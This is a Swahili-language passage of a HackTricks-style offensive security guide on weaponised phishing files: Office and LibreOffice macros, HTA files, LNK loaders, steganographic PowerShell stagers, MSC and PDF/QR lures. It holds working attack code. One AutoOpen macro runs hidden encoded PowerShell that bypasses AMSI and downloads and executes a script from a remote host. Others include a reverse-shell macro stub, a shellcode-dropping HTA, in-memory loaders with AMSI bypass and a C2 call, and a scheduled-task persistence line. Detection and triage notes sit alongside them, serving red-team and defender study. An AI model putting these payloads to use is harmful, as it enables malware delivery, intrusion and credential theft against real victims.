# Faili na Hati za Phishing

{{#include ../../banners/hacktricks-training.md}}

## Hati za Office

Microsoft Word huthibitisha data ya faili kabla ya kuifungua. Uthibitishaji wa data hufanywa kwa kutambua muundo wa data, kwa kuzingatia kiwango cha OfficeOpenXML. Hitilafu yoyote ikitokea wakati wa kutambua muundo wa data, faili linalochambuliwa halitafunguliwa.

Kwa kawaida, faili za Word zilizo na macros hutumia kiendelezi cha `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha kiendelezi chake na bado kuhifadhi uwezo wake wa kutekeleza macros.\
Kwa mfano, faili la RTF haliwezi kutumia macros kwa muundo wake, lakini faili la DOCM likipewa jina jipya na kiendelezi cha RTF litashughulikiwa na Microsoft Word na litaweza kutekeleza macros.\
Vipengele vya ndani na mifumo hiyo hiyo hutumika katika programu zote za Microsoft Office Suite (Excel, PowerPoint n.k.).

Unaweza kutumia amri ifuatayo kuangalia viendelezi ambavyo baadhi ya programu za Office zitatekeleza:

```bash
assoc | findstr /i "word excel powerp"
```

Faili za DOCX zinazorejelea kiolezo cha mbali (File –Options –Add-ins –Manage: Templates –Go) kilicho na macros zinaweza pia “kutekeleza” macros.

### Kupakia Picha ya Nje

Nenda: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, na **Filename or URL**:_ http://<ip>/whatever

![Hati za Office - Kupakia Picha ya Nje: Nenda: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor ya Macros

Inawezekana kutumia macros kutekeleza msimbo wowote kutoka kwenye hati.

#### Vitendaji vya Autoload

Kadiri zinavyotumiwa sana, ndivyo uwezekano wa AV kuzitambua unavyoongezeka.

- AutoOpen()
- Document_Open()

#### Mifano ya Msimbo wa Macros

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Ondoa metadata mwenyewe

Nenda kwenye **File > Info > Inspect Document > Inspect Document**, jambo ambalo litafungua Document Inspector. Bofya **Inspect** kisha **Remove All** karibu na **Document Properties and Personal Information**.

#### Kiendelezi cha Doc

Ukimaliza, chagua menyu kunjuzi ya **Save as type**, badilisha umbizo kutoka **`.docx`** hadi Word 97-2003 **`.doc`**.\
Fanya hivi kwa sababu **huwezi kuhifadhi macro ndani ya `.docx`** na kuna **unyanyapaa** **kuhusu** kiendelezi cha macro-enabled **`.docm`** (kwa mfano, ikoni ya kijipicha ina `!` kubwa na baadhi ya gateways za wavuti/barua pepe huzizuia kabisa). Kwa hiyo, kiendelezi hiki cha zamani cha **`.doc` ndicho chaguo bora zaidi la kati**.

#### Jenereta za Malicious Macros

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

Hati za LibreOffice Writer zinaweza kupachika Basic macros na kuzifanya zijitekeleze kiotomatiki faili inapofunguliwa kwa kufunga macro kwenye tukio la **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Macro rahisi ya reverse shell inaonekana hivi:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Kumbuka alama za nukuu zilizorudiwa (`""`) ndani ya string – LibreOffice Basic huzitumia kuwakilisha alama halisi za nukuu, kwa hivyo payload zinazoishia na `...==""")` huweka command ya ndani na argument ya Shell zikiwa zimesawazishwa.

Vidokezo vya uwasilishaji:

- Hifadhi kama `.odt` na uunganishe macro na tukio la hati ili ianze mara tu hati inapofunguliwa.
- Unapotuma barua pepe kwa `swaks`, tumia `--attach @resume.odt` (`@` inahitajika ili bytes za faili, badala ya string ya jina la faili, zitumwe kama kiambatisho). Hili ni muhimu unapotumia vibaya SMTP servers zinazokubali wapokeaji wa `RCPT TO` kiholela bila uthibitishaji.

## Faili za HTA

HTA ni programu ya Windows **inayochanganya HTML na lugha za scripting (kama VBScript na JScript)**. Huunda kiolesura cha mtumiaji na huendeshwa kama programu "inayoaminika kikamilifu", bila vikwazo vya modeli ya usalama ya browser.

HTA huendeshwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **husakinishwa** pamoja na **Internet Explorer**, hivyo **`mshta` hutegemea IE**. Kwa hiyo, ikiwa IE imeondolewa, HTA hazitaweza kuendeshwa.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Kulazimisha NTLM Authentication

Kuna njia kadhaa za **kulazimisha NTLM authentication "kwa mbali"**, kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye barua pepe au HTML ambayo mtumiaji atafungua (hata HTTP MitM?). Au mtumie mwathiriwa **anwani ya faili** itakayochochea **authentication** kwa **kufungua tu folda.**

**Angalia mawazo haya na mengine kwenye kurasa zifuatazo:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Usisahau kwamba unaweza si tu kuiba hash au authentication, bali pia **kufanya mashambulizi ya NTLM relay**:

- [**Mashambulizi ya NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay kwenda kwenye certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (msururu usio na faili)

Kampeni zenye ufanisi mkubwa hutuma ZIP iliyo na nyaraka mbili halali za kupotosha (PDF/DOCX) na .lnk hasidi. Ujanja ni kwamba PowerShell loader halisi imehifadhiwa ndani ya raw bytes za ZIP baada ya alama ya kipekee, na .lnk huitoa na kuiendesha yote kwenye memory.<sup>[[2]](#references)</sup>

Mtiririko wa kawaida unaotekelezwa na one-liner ya PowerShell ya .lnk:

1) Tafuta ZIP asili katika njia za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na folda mama ya working directory ya sasa.
2) Soma bytes za ZIP na utafute alama iliyowekwa moja kwa moja kwenye msimbo (kwa mfano, xFIQCV). Kila kitu baada ya alama hiyo ni PowerShell payload iliyopachikwa.
3) Nakili ZIP hadi %ProgramData%, ifungue hapo, kisha ufungue .docx ya kupotosha ili ionekane halali.
4) Bypass AMSI kwa mchakato wa sasa: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Ondoa obfuscation ya hatua inayofuata (kwa mfano, ondoa herufi zote za #) na uitekeleze kwenye memory.

Mfano wa skeleton ya PowerShell ya kutoa na kuendesha hatua iliyopachikwa:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Vidokezo
- Usambazaji mara nyingi hutumia vibaya subdomain za PaaS zinazotambulika (k.m., *.herokuapp.com) na unaweza kuweka masharti kwa payloads (kuwasilisha ZIP zisizo na madhara kulingana na IP/UA).
- Hatua inayofuata mara nyingi hufungua shellcode ya base64/XOR na kuiendesha kupitia Reflection.Emit + VirtualAlloc ili kupunguza alama kwenye diski.

Persistence iliyotumika katika mnyororo huohuo
- Utekaji wa COM TypeLib wa kidhibiti cha Microsoft Web Browser ili IE/Explorer au programu yoyote inayokipachika ikizinduliwa tena iweze kuzindua payload kiotomatiki.<sup>[[2]](#references)[[4]](#references)</sup> Tazama maelezo na amri zilizo tayari kutumika hapa:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Utafutaji/IOCs
- Faili za ZIP zilizo na mfuatano wa alama wa ASCII (k.m., xFIQCV) ulioongezwa mwishoni mwa data ya archive.
- Faili ya .lnk inayoorodhesha folda za mzazi/mtumiaji ili kupata ZIP na kufungua hati ya chambo.
- Uchakachuaji wa AMSI kupitia [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Minyororo mirefu ya barua pepe za kikazi inayoishia na viungo vilivyohifadhiwa kwenye domain za PaaS zinazoaminika.

## LNK huonyesha chambo kwanza → scheduled-task persistence → CPL side-loading inayoaminika

Mchoro mwingine unaojirudia ni **`.lnk` inayoiga hati** ambayo hufungua mara moja chambo kisicho na madhara huku ikiandaa mnyororo halisi chinichini.<sup>[[3]](#references)</sup>

Mtiririko wa kazi ulioonekana:
1. Njia ya mkato **hujifanya kuwa PDF** na kutumia `conhost.exe` au proxy inayofanana kuzindua downloader ya PowerShell iliyofichwa.
2. PowerShell hugawa tokeni zilizo wazi (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) ili mifumo rahisi ya utambuzi inayotafuta `iwr`, `gci`, `ren`, `cpi`, au `schtasks` ikose amri hiyo.
3. Stager hupakua **hati ya chambo kwanza**, kuifungua kwa mwathiriwa, kisha kuunda upya faili hasidi chinichini.
4. Payloads zinaweza kuandikwa kwa kutumia **viendelezi vya kupotosha** kisha kubadilishwa majina kwa kuondoa herufi za kujaza, na hivyo kuchelewesha kuonekana kwa faili dhahiri za `.exe` / `.cpl`.
5. Persistence huwekwa kwa **scheduled task inayotekelezwa kila dakika** na kuzindua binary ya host inayoaminika kutoka kwenye njia inayoweza kuandikiwa na mtumiaji.

Vidokezo vya msingi vya kutafuta mchoro huu:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Mpangilio wa staging unaofaa kutambua ni:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` au `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Kwa nini stage ya pili ni fiche

Katika case study ya Rapid7, scheduled task ilizindua mara kwa mara **`Fondue.exe`** kutoka `C:\Users\Public\`. Kwa kuwa **`APPWIZ.cpl`** iliwekwa pamoja nayo na ikatoa **`RunFODW`**, binary inayoaminika ya Microsoft ili-side-load CPL ya mshambuliaji badala ya nakala halali ya mfumo.

CPL kisha:
- Husoma blob ya **AES-256-CBC** kutoka `C:\Windows\Tasks\editor.dat`
- Hu-decrypt kupitia **Windows CNG / `bcrypt.dll`**
- Hutenga memory inayoweza kutekelezwa na kunakili shellcode iliyo-decryptiwa humo
- Hui-execute kwa njia isiyo ya moja kwa moja kwa kupitisha pointer ya shellcode kama callback ya **`EnumUILanguagesW`**

Hatua hiyo ya mwisho inafaa kutafutwa kando: mara nyingi malware huepuka kuruka moja kwa moja kwa `((void(*)())buf)()` na badala yake hutumia vibaya **WinAPI halali inayopokea callback** ili kuhamisha utekelezaji.

Payload iliyo-decryptiwa katika kampeni hii ilikuwa shellcode ya **Donut**, ambayo kisha ilipanga PE ya mwisho kikamilifu kwenye memory na kufanya patch za **AMSI/WLDP/ETW** katika mchakato wa sasa kabla ya kukabidhi utekelezaji. Kwa maelezo zaidi kuhusu side-loading na uchakataji wa baadaye unaokaa kwenye memory, tazama:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Viashiria vya vitendo vya kutafuta:
- `.lnk` inayoanzisha `powershell.exe` au `conhost.exe`, kisha kuonyesha hati ya udanganyifu.
- Vipakuliwa vinavyodumu kwa muda mfupi kwenye **`C:\Users\Public\`**, vikifuatiwa mara moja na kubadilishwa majina kutoka viendelezi visivyo na maana.
- Scheduled tasks zenye majina yasiyo na mvuto kama `GoogleErrorReport` zinazoendesha kutoka **directories zinazoweza kuandikiwa na mtumiaji**.
- Binaries zinazoaminika zinazopakia faili za **`.cpl` / `.dll`** kutoka directory ileile isiyo ya mfumo.
- Blobs za maandishi za Base64 zinazoandikwa chini ya **`C:\Windows\Tasks\`** na kisha kusomwa na module iliyo-side-loadiwa.

## Payloads zilizofichwa kwenye picha kwa kutumia steganography (PowerShell stager)

Minyororo ya loader ya hivi majuzi husambaza JavaScript/VBS iliyofichwa ambayo hu-decode na kuendesha PowerShell stager ya Base64. Stager hiyo hupakua picha (mara nyingi GIF) iliyo na .NET DLL iliyosimbwa kwa Base64 na kufichwa kama maandishi ya kawaida kati ya alama za kipekee za mwanzo/mwisho. Script hutafuta vitenganishi hivi (mifano iliyoonekana porini: «<<sudo_png>> … <<sudo_odt>>>»), hutoa maandishi yaliyo kati yake, hu-decode Base64 kuwa bytes, hupakia assembly kwenye memory na kuita entry method inayojulikana kwa kutumia URL ya C2.<sup>[[5]](#references)</sup>

Mtiririko wa kazi
- Hatua ya 1: JS/VBS dropper iliyohifadhiwa kwenye archive → hu-decode Base64 iliyopachikwa → huzindua PowerShell stager kwa kutumia -nop -w hidden -ep bypass.
- Hatua ya 2: PowerShell stager → hupakua picha, huchopoa Base64 iliyotenganishwa kwa alama, hupakia .NET DLL kwenye memory na kuita method yake (kwa mfano, VAI) kwa kupitisha URL ya C2 na chaguo.
- Hatua ya 3: Loader hupata payload ya mwisho na kwa kawaida huiingiza kupitia process hollowing ndani ya binary inayoaminika (mara nyingi MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Tazama maelezo zaidi kuhusu process hollowing na utekelezaji wa proxy kupitia utility zinazoaminika hapa:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Mfano wa PowerShell wa kuchopoa DLL kutoka kwenye picha na kuita .NET method kwenye memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Maelezo
- Hii ni ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Alama hutofautiana kati ya kampeni.
- AM​​SI/ETW bypass na uondoaji wa obfuscation kwenye string hutumika mara nyingi kabla ya kupakia assembly.
- Utafutaji: changanua picha zilizopakuliwa ili kutafuta delimiters zinazojulikana; tambua PowerShell inayofikia picha na kusimbua blobs za Base64 mara moja.

Tazama pia zana za stego na mbinu za carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Hatua ya awali inayojirudia ni faili ndogo ya `.js` au `.vbs` iliyofichwa sana, inayowasilishwa ndani ya archive. Kusudi lake pekee ni kusimbua string ya Base64 iliyopachikwa na kuwasha PowerShell kwa kutumia `-nop -w hidden -ep bypass` ili kuanzisha hatua inayofuata kupitia HTTPS.<sup>[[5]](#references)</sup>

Mantiki ya msingi (kwa muhtasari):
- Soma maudhui ya faili yenyewe
- Tafuta blob ya Base64 kati ya string za upotoshaji
- S imbua kuwa PowerShell ya ASCII
- Tekeleza kwa `wscript.exe`/`cscript.exe` inayoanzisha `powershell.exe`

Dalili za kutafuta
- Viambatisho vya JS/VBS vilivyowekwa kwenye archive vinavyoanzisha `powershell.exe`, vikiwa na `-enc`/`FromBase64String` kwenye mstari wa amri.
- `wscript.exe` inayoanzisha `powershell.exe -nop -w hidden` kutoka kwenye njia za muda za mtumiaji.

## Nyaraka za MSC kama kontena za utekelezaji (GrimResource)

Faili za Microsoft Management Console (`.msc`) ni ufafanuzi wa console wa XML ambao kwa kawaida hufunguliwa na `mmc.exe`. **GrimResource** hutumia rejeleo la `StringTable` kwa rasilimali ya `apds.dll` iliyo na primitive ya zamani ya XSS, hivyo mtumiaji akifungua console iliyoundwa mahsusi husababisha JavaScript kuendeshwa ndani ya `mmc.exe`. Sampuli zilizozingatiwa ziliunganisha obfuscation inayotegemea `transformNode` na **DotNetToJScript** ili kuanzisha payload ya .NET bila kutumia njia ya kawaida ya Office macro.<sup>[[9]](#references)</sup>

Kwa static triage, ichukulie MSC isiyoaminika kama maandishi na **usiibofye mara mbili**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Viashiria vya runtime vyenye signal kubwa ni `mmc.exe` kupakia CLR au script components, kuanzisha miunganisho ya mtandao, au kuwasha `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe`, au executable isiyotarajiwa. Umbizo hili ni halali, kwa hivyo detections zinapaswa kuhusisha **asili + maudhui ya XML/script yenye mashaka + tabia ya `mmc.exe`** badala ya kuzuia kila MSC.<sup>[[9]](#references)</sup>

## PDF/QR za kuelekeza upya na udhibiti wa payload

PDF haihitaji exploit ili iwe na manufaa. Kampeni za hivi karibuni huweka **QR code au kiungo cha kawaida** kwenye hati inayoonekana kuwa salama, huelekeza browser session mbali na vidhibiti vya barua pepe, na kubinafsisha anwani lengwa kwa kutumia anwani ya mpokeaji. Microsoft iliripoti PDFs za mwaka 2025 ambazo URL za QR zilikuwa za kipekee kwa kila mpokeaji na kuelekeza kwenye miundombinu ya RaccoonO365 ya kuvuna credentials; mnyororo sambamba ulitumia udhibiti wa IP/mazingira kurudisha njia ya JavaScript/MSI kwa wageni waliochaguliwa, lakini PDF isiyo na madhara kwa scanners au clients wasiokubaliwa.<sup>[[10]](#references)</sup>

Chunguza vitendo vya PDF na QR codes zinazoonyeshwa. QR inaweza kuchorwa kwa vekta badala ya kuhifadhiwa kama picha inayoweza kutolewa, kwa hivyo rasterize kila ukurasa na pia utoe picha zilizopachikwa:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Kagua lengwa zilizofichuliwa na uelekezaji upya kutoka kwenye mfumo wa uchanganuzi uliotengwa bila kujithibitisha. Viashiria muhimu vya kutafuta ni pamoja na PDF zilizo na QR pekee na barua pepe zenye maudhui machache sana, anwani ya barua pepe ya mpokeaji ikiwa imepachikwa kwenye kigezo cha query, uelekezaji upya mara kadhaa kupitia huduma za upangishaji zinazoaminika, na maudhui tofauti kulingana na IP, eneo la kijiografia, vidakuzi, referrer au user agent. Linganisha maombi kwa kutumia profaili zinazodhibitiwa, kwa sababu ombi moja kutoka kwenye sandbox linaweza kupokea chambo pekee.<sup>[[10]](#references)</sup>

## Faili za Windows za kuiba NTLM hashes

Angalia ukurasa kuhusu **maeneo ya kuiba NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Kampeni ya ZipLine: Shambulio la kisasa la phishing linalolenga kampuni za Marekani](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Kufuatilia mbinu za Dropping Elephant kupitia mnyororo wa loader wenye mandhari ya China](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Mbinu mpya ya COM persistence (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader inasambaza aina mbalimbali za infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Utekelezaji kupitia proxy ya zana za msanidi zinazoaminika: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console kwa ufikiaji wa awali na kukwepa ulinzi](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Watendaji wa vitisho wanatumia msimu wa kodi kuendesha kampeni za phishing zenye mada ya kodi](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
